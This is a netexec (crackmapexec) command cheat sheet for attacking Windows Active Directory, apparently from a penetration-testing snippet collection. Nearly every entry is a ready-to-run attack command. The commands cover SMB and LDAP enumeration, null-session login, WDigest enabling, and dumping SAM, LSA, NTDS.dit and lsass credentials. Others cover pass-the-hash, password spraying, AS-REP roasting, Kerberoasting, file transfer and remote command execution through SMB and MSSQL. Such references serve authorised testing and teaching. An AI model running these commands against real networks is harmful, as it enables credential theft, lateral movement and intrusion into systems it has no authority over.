# netexec

% netexec, crackmapexec, windows, Active directory

## netexec - enumerate hosts, network
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example : netexec smb 192.168.1.0/24

https://mpgn.gitbook.io/crackmapexec/

```bash
netexec smb <ip>
```

## netexec - enumerate password policy
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
netexec smb <ip> -u <user> -p '<password>' --pass-pol
```

## netexec - enumerate null session
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
netexec smb <ip> -u '' -p ''
```

## netexec - enumerate anonymous login
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
netexec smb <ip> -u 'a' -p ''
```

## netexec - enumerate active sessions
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
netexec smb <ip> -u <user> -p '<password>' --sessions
```

## netexec - enumerate domain users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
netexec smb <ip> -u <user> -p '<password>' --users
```

## netexec - enumerate users by bruteforce the RID
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
netexec smb <ip> -u <user> -p '<password>' --rid-brute
```

## netexec - enumerate domain groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
netexec smb <ip> -u <user> -p '<password>' --groups
```

## netexec - enumerate local groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
netexec smb <ip> -u <user> -p '<password>' --local-groups
```

## netexec - enumerate shares
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate permissions on all shares

```bash
netexec smb <ip> -u <user> -p <password> -d <domain> --shares
```

## netexec - enumerate disks
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate disks on the remote target

```bash
netexec smb <ip> -u <user> -p '<password>' --disks
```

## netexec - enumerate smb target not signed
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line

```bash
netexec smb <ip> --gen-relay-list smb_targets.txt
```

## netexec - enumerate logged users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
netexec smb <ip> -u <user> -p '<password>' --loggedon-users
```

## netexec - enable wdigest
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 

enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
netexec smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
```

## netexec - loggout user
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

Can be useful after enable wdigest to force user to reconnect

```bash
netexec smb <ip> -u <user> -p '<password>' -x 'quser'
netexec smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
```

## netexec - local-auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
netexec smb <ip> -u <user> -p <password> --local-auth
```

## netexec - local-auth with hash
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

```bash
netexec smb <ip> -u <user> -H <hash> --local-auth
```

## netexec - domain auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
netexec smb <ip> -u <user> -p <password> -d <domain>
```

## netexec - kerberos auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
netexec smb <ip> --kerberos
```

## netexec - Dump SAM
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump SAM hashes using methods from secretsdump.py
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

```bash
netexec smb <ip> -u <user> -p <password> -d <domain> --sam
```

## netexec - Dump LSA
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump LSA secrets using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
netexec smb <ip> -u <user> -p <password> -d <domain> --lsa
```

## netexec - dump ntds.dit
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump the NTDS.dit from target DC using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
netexec smb <ip> -u <user> -p <password> -d <domain> --ntds
```

## netexec - dump lsass
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
netexec smb <ip> -u <user> -p <password> -d <domain> -M lsassy
```

## netexec - dump lsass - with bloodhond update
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
netexec smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## netexec - password spray (user=password)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
netexec smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## netexec - password spray multiple test 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning

(careful on lockout)

```bash
netexec smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## netexec - put file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
netexec smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## netexec - get file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
netexec smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

## netexec - ASREPRoast enum without authentication
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

User can be a wordlist too (user.txt)
Hashcat format  -m 18200 

```bash
netexec ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## netexec - ASREPRoast enum with authentication
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON  

Hashcat format  -m 18200 

```bash
netexec ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## netexec - Kerberoasting
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

Hashcat format  -m 13100

```bash
netexec ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
```

## netexec - Unconstrained delegation
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

List of all computers et users with the flag TRUSTED_FOR_DELEGATION

```bash
netexec ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```

## netexec - winrm-auth
#plateform/linux #target/remote #port/5985 #port/5986 #protocol/winrm #cat/ATTACK/CONNECT  

```bash
netexec winrm <ip> -u <user> -p <password>
```

## netexec - mssql password spray
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/BRUTEFORCE-SPRAY  

```bash
netexec mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## netexec - mssql execute query
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
netexec mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## netexec - mssql execute command
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
netexec mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
```

= ip: 192.168.1.0/24
